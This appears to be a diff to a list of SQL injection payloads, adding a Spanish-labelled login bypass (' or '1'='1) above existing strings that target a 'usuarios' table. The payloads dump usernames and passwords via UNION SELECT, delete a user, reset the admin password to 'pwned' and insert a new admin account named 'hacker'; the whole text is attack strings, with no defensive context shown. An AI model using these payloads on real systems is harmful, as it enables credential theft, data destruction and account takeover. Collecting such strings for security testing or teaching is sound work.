@@ -1,4 +1,8 @@
+Inicio de sesión:
+' or '1'='1
+
 %' UNION SELECT username,password,rol FROM usuarios--
 '; DELETE FROM usuarios WHERE id_usuario=3--
 %'; UPDATE usuarios SET password='pwned' WHERE username='admin'--
 %'; INSERT INTO usuarios (username, password, rol) VALUES ('hacker','hacker123','admin')--
+
